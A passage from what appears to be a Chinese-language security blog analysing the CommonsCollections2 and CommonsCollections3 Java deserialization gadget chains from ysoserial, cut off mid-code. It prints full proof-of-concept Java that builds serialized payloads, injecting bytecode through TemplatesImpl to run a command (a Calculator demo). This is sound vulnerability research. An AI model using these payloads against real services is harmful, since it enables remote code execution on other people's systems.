com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections2</span> <span class="variable">commonsCollections2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections2</span>();</span><br><span class="line">        commonsCollections2.serialize();</span><br><span class="line">        commonsCollections2.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="ysoserial中的利用链"><a href="#ysoserial中的利用链" class="headerlink" title="ysoserial中的利用链"></a>ysoserial中的利用链</h2><p>在<code>ysoserial</code>中的利用链则和前面我们所构造的有所不同，gadget 如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure><p>与我们前面构造的 POC 不同的是，<code>ysoserial</code>后面采用了<code>TemplatesImpl</code>类，我们跟进<code>TemplatesImpl#newTransformer()</code>方法<br><img src="images/image-20221010113159001.png" alt="image-20221010113159001"></p><p>该方法中调用了<code>getTransletInstance()</code>，继续跟进<code>getTransletInstance()</code>源码<br><img src="images/image-20221010113437251.png" alt="image-20221010113437251"></p><p>上面可以看到当<code>this._class</code>为<code>null</code>时就会调用<code>defineTransletClasses()</code>方法，因为<code>this._class</code>为<code>TemplatesImpl</code>类的属性，所以是可以通过反射控制的。</p><p>继续跟进<code>defineTransletClasses()</code>方法<br><img src="images/image-20221010113526585.png" alt="image-20221010113526585"></p><p>这里通过<code>load.defineClass()</code>方法将字节码进行加载定义一个新的类，而<code>this._bytecodes</code>也是类的属性，所以也是可以通过反射进行控制字节码。此外，接下来的<code>superClass.getName().equals(ABSTRACT_TRANSLET)</code>判断新定义的类是否继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>类，只有继承才会将下标<code>i</code>赋值给<code>this._transletIndex</code>。</p><p>最后再通过<code>newInstance()</code>方法实例化新定义的类<br><img src="images/image-20221010114142369.png" alt="image-20221010114142369"></p><p>构造 POC 为<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections2</span> <span class="variable">commonsCollections2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections2</span>();</span><br><span class="line">        commonsCollections2.serialize();</span><br><span class="line">        commonsCollections2.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造InvokerTransformer</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(invokerTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 通过反射修改queue</span></span><br><span class="line">        Object[] objectsArrary = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        queue.set(priorityQueue,objectsArrary);</span><br><span class="line">        <span class="comment">// 通过反射将comparator修改为前面的链子</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221010161316401.png" alt="image-20221010161316401"></p><p><strong>这里为什么需要再通过一次反射修改 queue ？</strong> </p><p>可以往回到<code>compara()</code>方法，因为我们这次使用的是<code>InvokerTransformer</code>，其中的<code>transform()</code>参数<code>obj1</code>需要设置为<code>TemplatesImpl</code>类，去触发<code>TemplatesImpl#newTransformer()</code><br><img src="images/image-20221010162150110.png" alt="image-20221010162150110"></p><p>那为什么不在第一个<code>priorityQueue.add(1)</code>时加入呢？因为在后面会有一个数组间的元素比较，而对象和数字，以及对象和对象是无法比较的。</p><p>接下来回答一下开头说的为什么<code>javassist</code>是个伪条件，跟下来其实发现<code>javassist</code>的作用就是构造一个恶意类，最后这个恶意类被转换成了字节码。而我们可以本地构造好恶意类的字节码，直接设置到<code>_bytecodes</code>，无需在目标主机上去通过<code>javassist</code>构造。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections3利用链分析</title>
      <link href="/2022/11/10/CommonsCollections3/"/>
      <url>/2022/11/10/CommonsCollections3/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections3利用链分析"><a href="#CommonsCollections3利用链分析" class="headerlink" title="CommonsCollections3利用链分析"></a>CommonsCollections3利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>CommonsCollections3</code>利用环境如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">jdk 8u71 版本之前</span><br></pre></td></tr></table></figure><p>先看利用链：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                            newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         <span class="title function_">newInstance</span><span class="params">()</span></span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>看到这个利用链，前半部分是<code>CommonsCollections1</code>的内容，而后半部分则是<code>CommonsCollection2</code>的内容，不过与<code>CommonsCollections2</code>不同的是，不再利用<code>invokerTransformer</code>类，而是使用<code>InstantiateTransformer</code>类。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>翻一下<code>ysoserial</code>中的源码<br><img src="images/image-20221010171824472.png" alt="image-20221010171824472"></p><p>可以看见这次<code>transformers</code>由<code>ConstantTransformer</code>和<code>InstantiateTransformer</code>组成，其中<code>ConstantTransformer</code>传入的类为<code>TrAXFilter</code>，先跟进该类看看源码<br><img src="images/image-20221010173113393.png" alt="image-20221010173113393"></p><p>发现该类会调用<code>newTransformer()</code>方法，接着继续跟进看<code>InstantiateTransformer()</code><br><img src="images/image-20221010174156050.png" alt="image-20221010174156050"></p><p>在<code>InstantiateTransformer#transform()</code>方法中，通过<code>getConstructor()</code>方法进行实例化，而这里的<code>input</code>则是前面构造的<code>TrAXFilter</code>类，因此可以触发<code>TransformerImpl#newTransformer()</code>方法加载构造的恶意字节码进而命令执行。</p><p>在给出的利用链中可以看到触发<code>xxx.transform()</code>方法用的是前面<code>CommonsCollections1</code>中的<code>LazyMap.get()</code>方法，因此可以编写出 POC 了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections3</span> <span class="variable">commonsCollections3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections3</span>();</span><br><span class="line">        commonsCollections3.serialize();</span><br><span class="line">        commonsCollections3.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>,targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title 